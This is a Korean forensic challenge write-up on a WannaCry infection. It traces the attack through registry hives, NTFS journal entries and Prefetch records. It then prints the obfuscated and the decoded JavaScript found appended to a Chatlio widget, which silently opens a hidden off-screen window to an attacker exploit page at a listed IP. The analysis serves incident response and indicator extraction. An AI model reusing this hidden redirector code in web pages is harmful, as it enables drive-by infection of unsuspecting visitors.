# WannaCry 침해사고 분석

## 개요

침해 이미지에서 REGA(레지스트리), NTFS Log Tracker(저널), Prefetch(실행 흔적)를 교차 분석하여 **감염 경로와 최초 실행 시각, 공격자 인프라**를 추적하는 포렌식 챌린지다.

![](../Images/screencapture-192-168-202-91-4444-2026-11-26-14_08_14.png)

---

## 1. 레지스트리 분석 (REGA)

FTK Imager에서 REGA에 넘길 **5개 하이브 파일**(SAM, SECURITY, SOFTWARE, SYSTEM, NTUSER.DAT)을 export하여 REGA에 로드한다.

![](../Images/Pasted%20image%2020261126142346.png)

분석 실행.

![](../Images/Pasted%20image%2020261126142407.png)

### 사용자명 식별
사용자명은 `global_001`로 추정.

![](../Images/Pasted%20image%2020261126142519.png)

### IP 주소 식별
로컬 사용자 TCP/IP 설정으로 IP 확인.

![](../Images/Pasted%20image%2020261126142640.png)

### 운영체제 Product 식별

![](../Images/Pasted%20image%2020261126142752.png)

> 참고: `SOFTWARE\Microsoft\Windows NT\CurrentVersion`에 OS 제품명/빌드가, `SYSTEM\...\Tcpip\Parameters\Interfaces`에 IP 설정이, `SAM`에 로컬 계정이 담긴다. 레지스트리는 "시스템의 환경설정 스냅샷"이라 사용자/네트워크/설치정보의 1차 출처다.

---

## 2. NTFS Log Tracker — 파일 추출 흔적

![](../Images/Pasted%20image%2020261126143345.png)

경로를 길게 지정하고 Parsing하면 결과가 표시된다.

![](../Images/Pasted%20image%2020261126143622.png)

![](../Images/Pasted%20image%2020261126144949.png)

![](../Images/Pasted%20image%2020261126145812.png)

- 해당 파일에서 악성코드가 **실행되었지만 최초 악성코드는 아니라**고 판단.

![](../Images/Pasted%20image%2020261126145853.png)

- `sche.exe` 파일의 **MAC time(MAT) 기록**을 확인.

> MAC time (= MACB): **M**odified(내용 수정) / **A**ccessed(접근) / **C**hanged(MFT 메타데이터 변경) / **B**irth(생성). 파일의 생성·실행·수정 순서를 재구성하는 핵심 타임스탬프. 단, 공격자가 변조(timestomping)할 수 있어 USN·Prefetch와 교차검증이 필요하다.

---

## 3. Prefetch — 최초 실행 시각 추적

메모한 생성 시각 직전에 실행/생성된 파일을 `C:\Windows\Prefetch`에서 확인한다.

![](../Images/Pasted%20image%2020261126150208.png)

**실행 시각: 2017-10-21 05:00:00**

> Prefetch란: Windows가 **프로그램 실행을 빠르게 하려고** 실행 파일의 로딩 정보를 `C:\Windows\Prefetch\*.pf`에 기록하는 캐시. 포렌식에서는 **"이 프로그램이 언제, 몇 번 실행됐는가"**를 입증하는 강력한 실행 증거다. (파일명, 마지막 실행 시각, 실행 횟수 포함)

- 인터넷 익스플로러를 통한 접근 가능성이 높아 Download 폴더를 확인했으나 `.ini` 외 특정 파일이 없었다.
- IE 브라우저 **캐시/임시 폴더**(Temporary Internet Files) 위치를 확인하니, **실행 시각 직후의 기록**이 남아 있었다.

![](../Images/Pasted%20image%2020261126150952.png)

하위 `\Temp` 경로에서 근접 시각의 파일 하나가 포착됨.

![](../Images/Pasted%20image%2020261126151238.png)

![](../Images/Pasted%20image%2020261126152002.png)

해당 위치가 원본의 절대 경로가 아닌 것으로 보여, 사용자 프로파일 쪽을 다시 탐색.

![](../Images/Pasted%20image%2020261126152702.png)

약 4시 52분 시점 이후로 3개 파일 모두 기록이 끊김.

![](../Images/Pasted%20image%2020261126152846.png)

![](../Images/Pasted%20image%2020261126153614.png)

여기서 **공격자 IP가 노출**되고, **`flower.html` 단서**를 확보.

![](../Images/Pasted%20image%2020261126170144.png)

---

## 4. 난독화된 악성 JavaScript 분석 (`chatliob304[2].js`)

브라우저 캐시에서 발견된 스크립트. 정상 Chatlio 위젯 코드 뒤에 **난독화된 악성 코드**가 붙어 있고, 숨겨진 창으로 **익스플로잇 페이지로 리다이렉트**한다.

```javascript
(function() {
    "use strict";
    this.__ZERVER_MODULES = this.__ZERVER_MODULES || {}, /* ... 정상 Chatlio 위젯 로더 ... */
    i.src = "https://w.chatlio.com/w.chatlio-widget.js", /* ... */
}).call(this);

eval(function(p, a, c, k, e, d) {
    /* Dean Edwards packer 형태의 난독화 루틴 */
    ...
}('3 b(){6=h.q(...flower...html...)}...', 44, 44,
  'no||now|function|num|new|mw|10000|closeWin|Date|var|openWin|stop|getTime|sleep|flower|html|window|...'.split('|'), 0, {}))
```

위 코드는 **Dean Edwards packer**로 난독화되어 있고, 복원하면 다음과 같다.

```javascript
function openWin() {
  mw = window.open(
    'http://58.17.34.44/jscdn/js/flower.html',   // 익스플로잇 페이지
    '_blank',
    'toolbar=no, status=no, menubar=no, scrollbars=no, resizable=no,' +
    'left=10000, top=10000, width=1, height=1, visible=none',  // 화면 밖 1x1 숨김 창
    ''
  )
}
function closeWin() { mw.close() }
function sleep(num) {
  var now = new Date();
  var stop = now.getTime() + num;
  while (true) { now = new Date(); if (now.getTime() > stop) return }
}

openWin();      // 숨겨진 창으로 익스플로잇 페이지 열기
sleep(10000);   // 10초 대기 (익스플로잇 실행 시간 확보)
closeWin();     // 창을 닫아 흔적 제거
```

### 분석 정리
- **은닉:** `width=1, height=1, left=10000, top=10000, visible=none` → 사용자 눈에 안 보이는 **1×1 창을 화면 밖**에 띄운다.
- **리다이렉트:** 숨은 창으로 `http://58.17.34.44/jscdn/js/flower.html`(공격자 익스플로잇 페이지)를 로드. 이것이 **드라이브 바이 다운로드**의 리다이렉터 역할.
- **시간 확보 후 흔적 제거:** `sleep(10000)`으로 익스플로잇 실행 시간을 벌고 `closeWin()`으로 창을 닫아 흔적을 지운다.
- **공격자 인프라 IOC:** `58.17.34.44`, `/jscdn/js/flower.html`.

> 왜 난독화하나: `eval(packer(...))` 패턴은 **시그니처 기반 탐지 회피**와 분석 지연이 목적. 대응은 packer를 복원(deobfuscate)해 최종 동작(window.open 대상 URL)을 확인하는 것. 여기서는 리다이렉트 대상 IP/경로가 핵심 IOC가 된다.
